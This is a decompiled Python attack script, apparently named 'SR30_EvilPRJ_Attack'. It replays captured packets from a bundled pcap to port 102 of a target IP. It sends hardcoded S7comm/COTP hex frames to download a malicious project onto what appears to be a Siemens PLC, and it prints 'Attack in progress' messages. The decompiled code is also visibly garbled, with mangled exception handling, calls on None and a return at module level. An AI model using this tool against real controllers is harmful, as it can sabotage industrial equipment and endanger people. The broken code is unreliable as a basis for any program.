# Source Generated with Decompyle++
# File: SR30_EvilPRJ_Attack.pyc (Python 3.9)

from scapy.all import *
from binascii import *
import socket
import time
import argparse
import pkg_resources

def extract_payload(file_name, port):
    payload_data = []
    
    try:
        packets = rdpcap(file_name)
    finally:
        pass
    e = None
    
    try:
        print(f'''Error reading pcap file: {e}''')
    finally:
        e = None
        del e
        return None
        e = None
        del e
        for packet in packets:
            if packet.haslayer(TCP) and int(packet[TCP].dport) == port:
                payload = bytes(packet[TCP].payload)
                if len(payload) > 7:
                    payload_data.append(payload)
                    continue
                    return payload_data




def send_data(server_ip, port, data_list):
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((server_ip, port))
            print('-------Attack in progress-------')
            s.send(a2b_hex('0300001611e00000002500c1020101c2020101c0010a'))
            s.send(a2b_hex('0300001902f08032010000ccc100080000f0000001000103c0'))
            for data in data_list:
                s.sendall(data)
                time.sleep(0.1)
            s.send(a2b_hex('0300002502f08032010000003a0014000028000000000000fd000009505f50524f4752414d'))
            time.sleep(0.6)
            s.close()
            print('-------Dowmload EvilPRJ  Successful!-------')
            None(None, None, None)
        with None:
            if not None:
                pass
    finally:
        pass
    e = None
    
    try:
        print(f'''Error sending data: {e}''')
    finally:
        e = None
        del e
    e = None
    del e
    return None



parser = argparse.ArgumentParser('Process pcap file and send payload to a server.', **('description',))
parser.add_argument('server_ip', str, 'IP address of the server to send payload to.', **('type', 'help'))
args = parser.parse_args()
server_ip = args.server_ip
port = 102
file_name = pkg_resources.resource_filename(__name__, 'Fault_PRJ.pcap')

try:
    payload_data = extract_payload(file_name, port)
    send_data(server_ip, port, payload_data)
finally:
    pass
e = None

try:
    print(f'''An error occurred: {e}''')
finally:
    e = None
    del e
e = None
del e
return None


